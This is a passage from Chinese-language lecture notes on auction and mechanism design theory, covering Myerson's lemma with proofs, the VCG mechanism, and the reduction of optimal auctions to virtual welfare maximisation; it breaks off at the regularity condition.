<li>因为任何机制都可以转化为直接显示机制，而这种转化不会改变机制的结果；</li>
<li>因此，仅通过这一类机制，我们就能获得所有可能机制的结果，从而大大缩小了机制设计中需要考虑的机制集合；</li>
<li>此外，在直接显示机制中，参与者需要诚实地报告自己的类型，从而解决了信息不对称的问题。</li>
</ul>
<p>显示机制是由2007年诺贝尔经济学奖得主迈尔森提出并证明的，他获得诺奖的最重要贡献之一就是显示原理。</p>
<hr />
<h3 id="note-datamarket-auction-_9">迈尔森引理<a class="headerlink" href="#note-datamarket-auction-_9" title="Permanent link">&para;</a></h3>
<p>一价拍卖是激励相容的直接显示机制，然而一价拍卖并不是。</p>
<p>自然的问题是：哪些机制是激励相容的？迈尔森引理（Myerson's lemma）给出了拍卖机制（从报价到分配和支付的机制）激励相容的充要条件：这里首先给出迈尔森引理在占优策略均衡下的版本</p>
<div class="admonition tip">
<p class="admonition-title">迈尔森引理</p>
<p>一个拍卖机制是 DSIC（占优策略激励相容）的，当且仅当其分配规则和支付规则 <span class="arithmatex">\((\mathbf{x}, \mathbf{p})\)</span> 满足：</p>
<ul>
<li><span class="arithmatex">\(x\)</span> 是单调的，即 <span class="arithmatex">\(x_i(b_i)\)</span> 是 <span class="arithmatex">\(b_i\)</span> 的单调不减函数；</li>
<li>给定 <span class="arithmatex">\(x\)</span> 的情况下，只要给定 <span class="arithmatex">\(p_i(0)\)</span> 的值，对任意的 <span class="arithmatex">\(i \in N\)</span> 和 <span class="arithmatex">\(b_i \in [0, +\infty)\)</span>，<span class="arithmatex">\(p\)</span> 的表达式是唯一确定的：</li>
</ul>
<div class="arithmatex">\[
p_i(b_i) = p_i(0) + b_i \cdot x_i(b_i) - \int_0^{b_i} x_i(s)ds.
\]</div>
</div>
<p>引理的第一个条件是很好理解的，即报价越高，获得物品的概率越高：</p>
<ul>
<li>直观而言，如果报价降低能有更高的概率获得物品，那么竞拍者就会有动机选择降低自己的报价，不符合激励相容性质；</li>
</ul>
<p>第二个条件说明，要满足 DSIC 性质，在给定的分配规则下，只要报价为 0 时的支付 <span class="arithmatex">\(p_i(0)\)</span> 确定（通常都为 0），则只有一种特定的支付规则能够使得竞拍者如实报告自己的估值。</p>
<p>这一支付规则被称为迈尔森支付公式。下图是一个直观解释：横坐标是竞拍者 <span class="arithmatex">\(i\)</span> 报价的取值，纵坐标是竞拍者 <span class="arithmatex">\(i\)</span> 的分配结果，<span class="arithmatex">\(x_i(b_i)\)</span> 所围成的曲线是分配规则，<span class="arithmatex">\(x_i(b_i)\)</span> 到纵坐标所围成的面积表示于长方形减去线下方面积，正好对应竞拍者 <span class="arithmatex">\(i\)</span> 报价为 <span class="arithmatex">\(b_i\)</span> 时的支付（设 <span class="arithmatex">\(p_i(0) = 0\)</span>）。</p>
<figure>
<img alt="" src="../NOTE/DataMarket/img/myerson1.png" width="500" />
</figure>
<p>显示直觉的权衡：不能提取全部的剩余，否则无法激励诚实。</p>
<div class="admonition example">
<p class="admonition-title">迈尔森引理与二价拍卖</p>
<p>根据二价拍卖的分配规则可知：</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/DataMarket/img/myerson2.png" width="500" />
</figure></p>
<ul>
<li>当 <span class="arithmatex">\(b_i &lt; \max_{j \neq i} b_j\)</span> 时，<span class="arithmatex">\(x_i\)</span> 在 <span class="arithmatex">\([0, b_i]\)</span> 内均为 0，因此根据迈尔森支付公式计算出此时支付 <span class="arithmatex">\(p_i(b_i) = 0\)</span>，符合二价拍卖结果；</li>
<li>当 <span class="arithmatex">\(b_i &gt; \max_{j \neq i} b_j\)</span> 时，<span class="arithmatex">\(x_i\)</span> 在 <span class="arithmatex">\([\max_{j \neq i} b_j, b_i]\)</span> 内均为 1，其余部分为 0。如下图所示</li>
</ul>
<p>因此根据迈尔森支付公式计算出此时支付</p>
<div class="arithmatex">\[
p_i(b_i) = b_i - \left(b_i - \max b_j\right) = \max b_j,
\]</div>
<p>也符合二价拍卖结果。</p>
<p>根据上图的直观，对于竞拍者 <span class="arithmatex">\(i\)</span> 而言，二价拍卖的分配规则是一个阶梯函数，其中间断点位于 <span class="arithmatex">\(\max_{j \neq i} b_j\)</span>，报价高于此值时获得物品，低于此值时不会获得物品。一般地，称阶梯形分配规则的间断点为关键值（critical value）。</p>
<p>需要注意的是，迈尔森引理并没有限制单物品拍卖，如果是多个完全相同物品的拍卖，且每个竞拍者具有单位需求（只需要一份物品，例如数据），不难发现上面的陈述并没有需要修改之处：</p>
<ul>
<li>此时买家的估值仍然是一维的；</li>
<li>问题：假设有 <span class="arithmatex">\(m\)</span> 个完全相同的物品，每个竞拍者具有单位需求，请设计 DSIC 拍卖机制。(从高到低分配给m个竞拍者，支付第m+1高的bid)</li>
</ul>
<p>综合显示原理和迈尔森引理，在之后的拍卖设计讨论中都只需要考虑竞拍者如实报告自己估值的机制，但在使用此类机制研究时要注意，在一个给定的分配规则下只有一种特定的支付规则才能达到。因此拍卖机制设计问题进一步转化为只需要设计分配规则，因为激励相容情况下的支付规则是对应唯一确定的（只要固定 <span class="arithmatex">\(p_i(0)\)</span> 的取值）。</p>
</div>
<p>在直观理解了迈尔森引理后，接下来给出迈尔森引理的证明：</p>
<p>首先验证"当"的部分，相对而言比较简单直接。设竞拍者 <span class="arithmatex">\(i\)</span> 的估值为 <span class="arithmatex">\(t_i\)</span>，当其报价为 <span class="arithmatex">\(t_i'\)</span> 时，其收益表达为</p>
<div class="arithmatex">\[
u_i(t_i') = t_i \cdot x_i(t_i') - p_i(t_i') = (t_i - t_i')x_i(t_i') + \int_0^{t_i'} x_i(s)ds - p_i(0),
\]</div>
<p>特别地，当报价 <span class="arithmatex">\(t_i' = t_i\)</span>，即竞拍者诚实报价时，其收益为</p>
<div class="arithmatex">\[
u_i(t_i) = \int_0^{t_i} x_i(s)ds - p_i(0).
\]</div>
<p>故有</p>
<div class="arithmatex">\[
u_i(t_i) - u_i(t_i') = (t_i' - t_i)x_i(t_i') - \int_{t_i}^{t_i'} x_i(s)ds
\]</div>
<p>当 <span class="arithmatex">\(t_i' \geqslant t_i\)</span> 时，由于 <span class="arithmatex">\(x_i\)</span> 是增函数，故</p>
<div class="arithmatex">\[
\int_{t_i}^{t_i'} x_i(s)ds \leqslant (t_i' - t_i)x_i(t_i'),
\]</div>
<p>因此 <span class="arithmatex">\(u_i(t_i) - u_i(t_i') \geqslant 0\)</span>。当 <span class="arithmatex">\(t_i' \leqslant t_i\)</span> 时同理可得 <span class="arithmatex">\(u_i(t_i) - u_i(t_i') \geqslant 0\)</span>。</p>
<p>故无论其他竞拍者的报价如何，竞拍者 <span class="arithmatex">\(i\)</span> 选择如实报告自己的估值是占优策略，因此该机制是 DSIC 的。</p>
<p>接下来证明"仅当"的部分，即要求激励相容推出这一机制。这里需要用到一个特殊的交换技巧。假设机制 <span class="arithmatex">\((\mathbf{x}, \mathbf{p})\)</span> 是 DSIC 的，有两个任意的变量 <span class="arithmatex">\(0 \leqslant y &lt; z\)</span>。一种可能的情况是，智能体 <span class="arithmatex">\(i\)</span> 的估值是 <span class="arithmatex">\(z\)</span>，提交报价是 <span class="arithmatex">\(y\)</span>，此时 DSIC 要求 <span class="arithmatex">\(u_i(z) \geqslant u_i(y)\)</span>(按估值报价收益不低于其它报价)，展开为</p>
<div class="arithmatex">\[
z \cdot x_i(z) - p_i(z) \geqslant z \cdot x_i(y) - p_i(y),
\]</div>
<p>另一种情况是，智能体 <span class="arithmatex">\(i\)</span> 的估值是 <span class="arithmatex">\(y\)</span>，提交报价是 <span class="arithmatex">\(z\)</span>，此时要求</p>
<div class="arithmatex">\[
y \cdot x_i(y) - p_i(y) \geqslant y \cdot x_i(z) - p_i(z),
\]</div>
<p>上述两式移项，组合后可以得到</p>
<div class="arithmatex">\[
z \cdot (x_i(y) - x_i(z)) \leqslant p_i(y) - p_i(z) \leqslant y \cdot (x_i(y) - x_i(z)),
\]</div>
<p>实际上由上式左右两端已经可以看出，<span class="arithmatex">\((z - y)(x_i(y) - x_i(z)) \leqslant 0\)</span>，因为 <span class="arithmatex">\(z &gt; y\)</span>，故 <span class="arithmatex">\(x_i(y) - x_i(z) \leqslant 0\)</span>，又因为这一结果对任意的 <span class="arithmatex">\(0 \leqslant y &lt; z\)</span> 成立，故 <span class="arithmatex">\(x_i\)</span> 是单调递增的，故也是可微且几乎处处可导的。</p>
<p>进一步地，对不等式中三部分别除以 <span class="arithmatex">\(y - z\)</span>，然后令 <span class="arithmatex">\(y \to z\)</span> 可得下式几乎处处成立：</p>
<div class="arithmatex">\[
p_i'(y) = y \cdot x_i'(y),
\]</div>
<p>两边对 <span class="arithmatex">\(y\)</span> 积分可得</p>
<div class="arithmatex">\[
\int_0^{b_i} p_i'(y)dy = \int_0^{b_i} y \cdot x_i'(y)dy,
\]</div>
<p>使用分部积分即可得到迈尔森支付公式</p>
<div class="arithmatex">\[
p_i(b_i) = p_i(0) + b_i \cdot x_i(b_i) - \int_0^{b_i} x_i(s)ds.
\]</div>
<h2 id="note-datamarket-auction-_10">福利最大化机制设计<a class="headerlink" href="#note-datamarket-auction-_10" title="Permanent link">&para;</a></h2>
<h3 id="note-datamarket-auction-vcg">VCG机制<a class="headerlink" href="#note-datamarket-auction-vcg" title="Permanent link">&para;</a></h3>
<p>考虑一般的物品分配场景：</p>
<ul>
<li>例如有四个竞拍者和四个不同的物品（例如四个不同地区/不同频段的频谱），记为 <span class="arithmatex">\(S = \{A, B, C, D\}\)</span>；</li>
<li>买家对 <span class="arithmatex">\(S\)</span> 的任意子集都有不同的估值；</li>
<li>可能的分配结果 <span class="arithmatex">\(\Omega\)</span> 包含将所有物品分配出去的所有可能结果，其中 <span class="arithmatex">\(\omega \in \Omega\)</span> 表示一个合理的分配方案；</li>
<li>例如将物品 <span class="arithmatex">\(B\)</span> 分配给竞拍者 1，<span class="arithmatex">\(A, C, D\)</span> 分配给竞拍者 2 就是一个合理的分配结果。</li>
</ul>
<p>如何为这种情况设计福利最大化的拍卖机制？</p>
<p>迈尔森引理中实家对物品的估值是一维变量可以描述的，此处无法做到。事实上迈尔森引理至今也无法推广至多维的一般情况。</p>
<p>因此我们需要求助于其他的机制。可能的分配结果集合记为 <span class="arithmatex">\(\Omega\)</span>，其中 <span class="arithmatex">\(\omega \in \Omega\)</span> 表示一个合理的分配结果。下面首先假设所有竞拍者是诚实报价的，即对分配结果 <span class="arithmatex">\(\omega\)</span> 的报价 <span class="arithmatex">\(b_i(\omega)\)</span> 就等于他对 <span class="arithmatex">\(\omega\)</span> 中给他分配的物品的效用值。则下面的分配规则给出了福利最大化的分配规则：</p>
<div class="arithmatex">\[
\omega^* = \arg\max_{\omega \in \Omega} \sum_{i=1}^n b_i(\omega).
\]</div>
<p>此外，为了讨论方便，记 <span class="arithmatex">\(\omega^*_{-i}\)</span> 为去掉参与人 <span class="arithmatex">\(i\)</span> 后的福利最大化分配结果，即 <span class="arithmatex">\(\omega^*_{-i} = \arg\max_{\omega \in \Omega} \sum_{j \neq i} b_j(\omega)\)</span>。记所有参与人的投标向量为 <span class="arithmatex">\(\mathbf{b} = (b_1, \ldots, b_n)\)</span>，下面的支付公式给出了福利最大化 DSIC 机制的支付规则：</p>
<div class="arithmatex">\[
p_i(\mathbf{b}) = \sum_{j \neq i} b_j(\omega^*_{-i}) - \sum_{j \neq i} b_j(\omega^*).
\]</div>
<p>上述公式的含义是，<span class="arithmatex">\(i\)</span> 需要支付的价格是，在 <span class="arithmatex">\(i\)</span> 不参与分配时其他人的最大福利情况下其他人的福利，事实上也可以理解为参与人 <span class="arithmatex">\(i\)</span> 给其他人所造成的负外部性。</p>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>VCG机制是DSIC的；</p>
</div>
<div class="admonition example">
<p class="admonition-title">VCG机制与二价拍卖</p>
<p>事实上，二价拍卖是 VCG 机制在单物品拍卖下的特例：</p>
<ul>
<li>首先，分配机制满足福利最大化。在单物品拍卖中，这意味着将物品分配给对物品估值最高的竞拍者，这与二价拍卖的原则一致。</li>
<li>
<p>其次是支付规则：</p>
</li>
<li>
<p>如果你不是估值最高的竞拍者，那么在你不参与时，最大福利等于估值最高的竞拍者的估值 <span class="arithmatex">\(v_i\)</span>；在你参与时，最大福利也等于估值最高的竞拍者的估值 <span class="arithmatex">\(v_i\)</span>，此时你的福利为0，因此，你的支付为 <span class="arithmatex">\(v_i - (v_i-0) = 0\)</span>。</p>
</li>
<li>如果你是估值最高的竞拍者，那么在你不参与时，最大福利等于估值第二高的竞拍者的估值 <span class="arithmatex">\(v_2\)</span>；在你参与时，最大福利等于你的估值 <span class="arithmatex">\(v_1\)</span>，此时你的福利为 <span class="arithmatex">\(v_1\)</span>。因此，你的支付为 <span class="arithmatex">\(v_2 - (v_1-v_1) = v_2\)</span>。</li>
</ul>
</div></section><section class="print-page" id="note-datamarket-optauction" heading-number="2.2.5.6"><h1 id="note-datamarket-optauction-_1">拍卖理论<a class="headerlink" href="#note-datamarket-optauction-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3852 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 13 分钟</p>
</div>
<h2 id="note-datamarket-optauction-_2">虚拟福利最大化<a class="headerlink" href="#note-datamarket-optauction-_2" title="Permanent link">&para;</a></h2>
<div class="admonition quote">
<p class="admonition-title">基本模型</p>
<p>考虑单物品情况，即一个卖家有一个不可分割的物品待出售；</p>
<ul>
<li>与此前单物品拍卖讨论一致，有 n 个潜在买家（竞拍者）<span class="arithmatex">\( N = \{1, 2, \ldots, n\} \)</span>；</li>
<li>每个买家 i 对物品有一个心理价值，表示为私有信息：</li>
<li>其连续分布概率密度 <span class="arithmatex">\( f_i: [a_i, b_i] \to \mathbb{R}^+ \)</span> 是共同知识，且 <span class="arithmatex">\( f_i(t_i) &gt; 0 \)</span> 对所有 <span class="arithmatex">\( t_i \in [a_i, b_i] \)</span> 成立；</li>
<li>记 <span class="arithmatex">\( T \)</span> 为所有参与者可能的估值组合，即</li>
</ul>
<div class="arithmatex">\[
    T = [a_1, b_1] \times [a_2, b_2] \times \ldots \times [a_n, b_n]
\]</div>
<ul>
<li>假定不同买家的估值分布是相互独立的（但不需同分布）；</li>
<li>故在 <span class="arithmatex">\( T \)</span> 上估值的联合密度函数记为 <span class="arithmatex">\( f(t) = \prod_{i=1}^n f_i(t_i) \)</span>；</li>
<li>按惯例记 <span class="arithmatex">\( f_{-i}(t_{-i}) = \prod_{j \in N, j \neq i} f_j(t_j) \)</span>，即除 i 之外所有买家的估值联合密度；</li>
<li>此外，为了讨论方便，卖家对物品的估值为 0 是共同知识。</li>
</ul>
</div>
<h3 id="note-datamarket-optauction-bic">BIC 迈尔森引理<a class="headerlink" href="#note-datamarket-optauction-bic" title="Permanent link">&para;</a></h3>
<p>由于考虑的是贝叶斯纳什均衡，因此应当考虑其他参与人都如实报告自己估值的，即 <span class="arithmatex">\(b_{-i} = t_{-i}\)</span> 时，估值为 <span class="arithmatex">\(t_i\)</span> 的竞拍者 <span class="arithmatex">\(i\)</span> 报告 <span class="arithmatex">\(t_i'\)</span> 的期望效用，这与 DSIC 不同，DSIC只需要考虑自己的就足够了。</p>
<div class="arithmatex">\[
U_i(t_i') = \int_{T_{-i}} (t_i \cdot x_i(t_i', t_{-i}) - p_i(t_i', t_{-i}))f_{-i}(t_{-i})dt_{-i}
\]</div>
<p>理解这一表达式：买家效用为他的估值 <span class="arithmatex">\(t_i\)</span> 乘以物品分配概率 <span class="arithmatex">\(x_i(t_i', t_{-i})\)</span>，减去支付 <span class="arithmatex">\(p_i(t_i', t_{-i})\)</span>。然而买家不能确定其他买家真实估值，因此还需要根据先验分布对其他人的估值求期望。因此 BIC 的条件就是 <span class="arithmatex">\(U_i(t_i) \geq U_i(t_i')\)</span> 对所有 <span class="arithmatex">\(i \in N\)</span> 和 <span class="arithmatex">\(t_i' \in [a_i, b_i]\)</span> 成立。</p>
<p>然而这一 <span class="arithmatex">\(U_i\)</span> 的表达式的确看起来非常不友好，因此会试图简化。定义</p>
<div class="arithmatex">\[
Q_i(t_i') = \int_{T_{-i}} x_i(t_i', t_{-i})f_{-i}(t_{-i})dt_{-i}
\]</div>
<p>则 <span class="arithmatex">\(Q_i(t_i')\)</span> 的含义为，当其他买家诚实报价，买家 <span class="arithmatex">\(i\)</span> 报价 <span class="arithmatex">\(t_i'\)</span> 时，他获得物品的概率。定义</p>
<div class="arithmatex">\[
M_i(t_i') = \int_{T_{-i}} p_i(t_i', t_{-i})f_{-i}(t_{-i})dt_{-i}
\]</div>
<p>则 <span class="arithmatex">\(M_i(t_i)\)</span> 的含义为，当其他买家诚实报价，买家 <span class="arithmatex">\(i\)</span> 报价 <span class="arithmatex">\(t_i'\)</span> 时，他的期望支付。因此，<span class="arithmatex">\(U_i(t_i')\)</span> 可以简化为</p>
<div class="arithmatex">\[
U_i(t_i') = t_i Q_i(t_i') - M_i(t_i')
\]</div>
<p>这就与 DSIC 情况下的 <span class="arithmatex">\(u_i(t_i') = t_i \cdot x_i(t_i') - p_i(t_i')\)</span> 形式上一致了，只是获得物品的概率和支付都求了期望，并且假定了其他买家如实报价。</p>
<p>因此仿照 DSIC 迈尔森引理可以给出 BIC 版本的迈尔森引理，并且证明过程完全类似，因此不再赘述，除了需要注意积分下界因为显示机制要求报价集合为 <span class="arithmatex">\(T_i = [a_i, b_i]\)</span> 而变为了 <span class="arithmatex">\(a_i\)</span>：</p>
<div class="admonition tip">
<p class="admonition-title">BIC 迈尔森引理</p>
<p>一个拍卖机制是 BIC（即贝叶斯激励相容）的，当且仅当其分配规则和支付规则 <span class="arithmatex">\((x, p)\)</span> 满足：</p>
<ul>
<li><span class="arithmatex">\(Q_i(t_i)\)</span> 是单调不减函数；</li>
<li>对任意的 <span class="arithmatex">\(i \in N\)</span> 和 <span class="arithmatex">\(b \in [a_i, b_i]\)</span>，有</li>
</ul>
<div class="arithmatex">\[
M_i(b) = M_i(a_i) + bQ_i(b) - \int_{a_i}^b Q_i(s)ds
\]</div>
</div>
<p>由此得到了 BIC 的充要条件。然而现在还不能转入最大化卖家收益的讨论。因为仅满足 BIC 的机制是不够合理（feasible）的。合理的机制除了满足 BIC 外，还应当满足如下两个条件：</p>
<ul>
<li><strong>第一个条件是分配规范性</strong>。因为只有一个物品在分配，故对于所有 <span class="arithmatex">\(t \in T\)</span>，有</li>
</ul>
<div class="arithmatex">\[
\sum_{i=1}^n x_i(t) \leq 1,
\]</div>
<p>并且 <span class="arithmatex">\(x_i(t) \geq 0\)</span> 对所有 <span class="arithmatex">\(i \in N\)</span> 和 <span class="arithmatex">\(t \in T\)</span> 成立；</p>
<ul>
<li><strong>第二个条件是</strong>，对所有 <span class="arithmatex">\(i \in N\)</span> 和 <span class="arithmatex">\(t_i \in [a_i, b_i]\)</span>，有 <span class="arithmatex">\(U_i(t_i) \geq 0\)</span>，即需要满足（事中阶段的）个人理性，否则竞拍者在得知自己的类型后会选择退出拍卖。</li>
</ul>
<p>下面的定理给出了在 BIC 的基础上满足个人理性的充要条件：</p>
<div class="admonition warning">
<p class="admonition-title">定理</p>
<p>一个 BIC 的拍卖机制是 IR（个人理性）的，当且仅当对于每个 <span class="arithmatex">\(i \in N\)</span> 都满足 <span class="arithmatex">\(M_i(a_i) \leq 0\)</span>。</p>
</div>
<p>即要求当竞拍者估值为最低值时的期望支付小于等于 0。</p>
<div class="admonition proof">
<p class="admonition-title">证明</p>
<p>根据 BIC 的条件，不难写出</p>
<div class="arithmatex">\[
U_i(t_i) = t_i Q_i(t_i) - M_i(t_i) = \int_{a_i}^{t_i} Q_i(s)ds - M_i(a_i).
\]</div>
<p>个人理性要求对任意的 <span class="arithmatex">\(t_i \in [a_i, b_i]\)</span>，都有 <span class="arithmatex">\(U_i(t_i) \geq 0\)</span>。因为等式右侧当 <span class="arithmatex">\(t_i = a_i\)</span> 时取最小值 <span class="arithmatex">\(-M_i(a_i)\)</span>，故个人理性成立当且仅当 <span class="arithmatex">\(M_i(a_i) \leq 0\)</span>。</p>
</div>
<h2 id="note-datamarket-optauction-_3">转化为虚拟福利最大化问题<a class="headerlink" href="#note-datamarket-optauction-_3" title="Permanent link">&para;</a></h2>
<p>首先当所有买家如实报告自己的类型时，投标结果为 <span class="arithmatex">\(t = (t_1, \ldots, t_n)\)</span>。卖家期望收入是（注意卖家对物品估值为 0，故只有卖出才能产生收益）</p>
<div class="arithmatex">\[
U_0 = \int_T \left(\sum_{i=1}^n p_i(t)\right) f(t)dt
\]</div>
<p>下面这一引理给出了最大化卖家收入 <span class="arithmatex">\(U_0\)</span> 的合理的最优机制的一个简洁明了的条件：</p>
<div class="admonition tip">
<p class="admonition-title">引理</p>
<p>假设分配规则 <span class="arithmatex">\(x\)</span> 最大化</p>
<div class="arithmatex">\[
\int_T \left(\sum_{i=1}^n \left(t_i - \frac{1-F_i(t_i)}{f_i(t_i)}\right) x_i(t)\right) f(t)dt,
\]</div>
<p>支付规则 <span class="arithmatex">\(p\)</span> 使得 <span class="arithmatex">\(M_i(a_i) = 0\)</span> 对所有 <span class="arithmatex">\(i \in N\)</span> 成立，且 <span class="arithmatex">\((x, p)\)</span> 满足 BIC、分配规范性和 IR，则 <span class="arithmatex">\((x, p)\)</span> 是合理的最优机制。</p>
</div>
<p>引理的具体证明因为技术性较强不展开描述，下面描述大致步骤：</p>
<ol>
<li><strong>根据 BIC 迈尔森引理和展开 <span class="arithmatex">\(U_0\)</span> 的表达式</strong>。然后利用分部变换技巧得到</li>
</ol>
<div class="arithmatex">\[
U_0 = \int_T \left(\sum_{i=1}^n \left(t_i - \frac{1-F_i(t_i)}{f_i(t_i)}\right) x_i(t)\right) f(t)dt + \sum_{i=1}^n M_i(a_i);
\]</div>
<ol>
<li>
<p><strong>从而目标转化为在满足 BIC、分配规范性和 IR 的情况下最大化上式</strong>。其中号前的部分只与分配规则 <span class="arithmatex">\(x\)</span> 有关，加号后的部分展开后只与支付规则 <span class="arithmatex">\(p\)</span> 有关，因此可以分别考虑这两个部分：</p>
</li>
<li>
<p>对于加号前的部分，目标就是找到分配机制 <span class="arithmatex">\(x\)</span> 使其最大化；</p>
</li>
<li>对于加号后的部分，根据个人理性等价条件有 <span class="arithmatex">\(M_i(a_i) \leq 0\)</span>，因此要最大化 <span class="arithmatex">\(U_0\)</span> 就要选择支付规则 <span class="arithmatex">\(p\)</span> 使得 <span class="arithmatex">\(M_i(a_i) = 0\)</span> 对所有 <span class="arithmatex">\(i \in N\)</span> 成立。</li>
</ol>
<p>由此，这一引理的结论得证。</p>
<p>有了这一引理，接下来的任务就是找到一个分配机制 <span class="arithmatex">\(x\)</span> 使得</p>
<div class="arithmatex">\[
\int_T \left(\sum_{i=1}^n \left(t_i - \frac{1-F_i(t_i)}{f_i(t_i)}\right) x_i(t)\right) f(t)dt
\]</div>
<p>最大化。而支付规则在 <span class="arithmatex">\(x\)</span> 确定后直接根据迈尔森引理以及 <span class="arithmatex">\(M_i(a_i) = 0\)</span> 的条件确定即可。</p>
<p>令</p>
<div class="arithmatex">\[
c_i(t_i) = t_i - \frac{1-F_i(t_i)}{f_i(t_i)},
\]</div>
<p>称其为竞拍者 <span class="arithmatex">\(i\)</span> 的 <strong>虚拟估值</strong> （virtual valuation），则目标就是找到一个分配机制 <span class="arithmatex">\(x\)</span> 使得</p>
<div class="arithmatex">\[
\int_T \left(\sum_{i=1}^n c_i(t_i)x_i(t)\right) f(t)dt
\]</div>
<p>最大化。</p>
<p>如果对任意的 <span class="arithmatex">\(t\)</span>，都能找到一个 <span class="arithmatex">\(x\)</span> 使得</p>
<div class="arithmatex">\[
\sum_{i=1}^n c_i(t_i)x_i(t)
\]</div>
<p>最大化，自然也能满足最大化要求。</p>
<ul>
<li>
<p>因此，目标进一步转化为找到一个分配机制 <span class="arithmatex">\(x\)</span> 使得对任意的 <span class="arithmatex">\(t\)</span>，都能找到一个 <span class="arithmatex">\(x\)</span> 使得 <span class="arithmatex">\(\sum_{i=1}^n c_i(t_i)x_i(t)\)</span> 最大化；</p>
</li>
<li>
<p>如果 <span class="arithmatex">\(c_i(t_i)\)</span> 是竞拍者 <span class="arithmatex">\(i\)</span> 的真实估值，那么最大化 <span class="arithmatex">\(\sum_{i=1}^n c_i(t_i)x_i(t)\)</span> 就是最大化竞拍者福利，然而 <span class="arithmatex">\(c_i(t_i)\)</span> 并不是真实估值，只是虚拟估值，因此这一问题称为 <strong>虚拟福利最大化问题</strong> 。</p>
</li>
</ul>
<div class="admonition summary">
<p class="admonition-title">虚拟福利最大化</p>
<ol>
<li><strong>利用显示原理将机制设计空间限制在直接显示机制</strong>，因此只需要设计竞拍者如实报告估值的机制，因此卖家收益最大化问题可以写为如下数学规划问题：</li>
</ol>
<div class="arithmatex">\[
\begin{align}
\max_{x,p} \quad &amp; U_0 = \int_T \left(\sum_{i=1}^n p_i(t)\right) f(t)dt \\
\text{s.t.} \quad &amp; (x,p) \text{ 满足 BIC}, \\
&amp; (x,p) \text{ 满足个人理性}, \\
&amp; \sum_{i=1}^n x_i(t) \leq 1.
\end{align}
\]</div>
<ol>
<li>
<p><strong>利用 BIC 迈尔森引理将 BIC 转化为两个等价条件</strong>，其一是期望分配概率 <span class="arithmatex">\(Q_i\)</span> 的单调性，其二是期望支付 <span class="arithmatex">\(M_i\)</span> 可由 <span class="arithmatex">\(Q_i\)</span> 和 <span class="arithmatex">\(M_i(a_i)\)</span> 唯一表达；</p>
</li>
<li>
<p><strong>将个人理性条件转化为等价条件</strong> <span class="arithmatex">\(M_i(a_i) \leq 0\)</span>；</p>
</li>
<li>
<p><strong>将目标函数利用积分变换等将目标问题转化为虚拟福利最大化问题</strong>。</p>
</li>
</ol>
</div>
<h3 id="note-datamarket-optauction-_4">最优机制<a class="headerlink" href="#note-datamarket-optauction-_4" title="Permanent link">&para;</a></h3>
<p>下面的任务是确定最优的分配机制 <span class="arithmatex">\(x\)</span> 使得虚拟福利最大化。事实上不难看出如何做到这一点：</p>
<ul>
<li>
<p>因为最大化目标函数是 <span class="arithmatex">\(\sum_{i=1}^n c_i(t_i)x_i(t)\)</span>，且要求 <span class="arithmatex">\(\sum_{i=1}^n x_i(t) \leq 1\)</span>，故而实际上要最大化的就是 <span class="arithmatex">\(c_i(t_i)\)</span> 的一个加权平均，其中权重不大于 1；</p>
</li>
<li>
<p>显然只需要给 <span class="arithmatex">\(c_i(t_i)\)</span> 最大的一项或多项赋予为 1 的权重即可，并且这一最大值必须大于等于 0，否则不如全部权重都为 0 的情况。即只允许同时满足</p>
<ul>
<li>最大化 <span class="arithmatex">\(c_i(t_i) = t_i - \frac{1-F_i(t_i)}{f_i(t_i)}\)</span></li>
<li><span class="arithmatex">\(c_i(t_i) \geq 0\)</span></li>
</ul>
</li>
</ul>
<p>两个条件的参与人 <span class="arithmatex">\(i\)</span> 有获得物品的概率，并且如果有这样的参与人，他们获得物品的概率和为 1。换一种说法，即</p>
<div class="arithmatex">\[
p_i(t) &gt; 0 \Rightarrow c_i(t_i) = \max_{j \in N} c_j(t_j) \geq 0.
\]</div>
<p>然而时刻要记住，我们设计的机制必须是合理的，即满足 BIC、分配规范性和 IR：</p>
<ul>
<li>
<p><strong>显然上述解已经满足了分配规范性</strong>，IR 与分配机制的选择无关，因此只需要考虑 BIC；</p>
</li>
<li>
<p><strong>根据 BIC 迈尔森引理</strong>，其中第二条与支付机制的选择有关，因此只需要检验第一条 <span class="arithmatex">\(Q_i(t_i)\)</span> 单调不减是否满足；</p>
</li>
<li>
<p><strong>这一条件并非一定成立</strong>。例如当 <span class="arithmatex">\(c_i\)</span> 为递减函数时，反而最低的估值会获得物品；</p>
</li>
<li>
<p>因此引入一个充分条件（称为正则化条件）来保证这一要求的成立：</p>
</li>
</ul>
<div class="admonition tip">
<p class="admonition-title">正则化条件</p>
<p>称这一问题符合正则化条件，如果对于任意的 <span class="arithmatex">\(i \in N\)</span>，都有 <span class="arithmatex">\(c_i(t_i)\)</span> 关于 <span class="arithmatex">\(t_i\)</span> 是单调递增的：</p>
<ul>
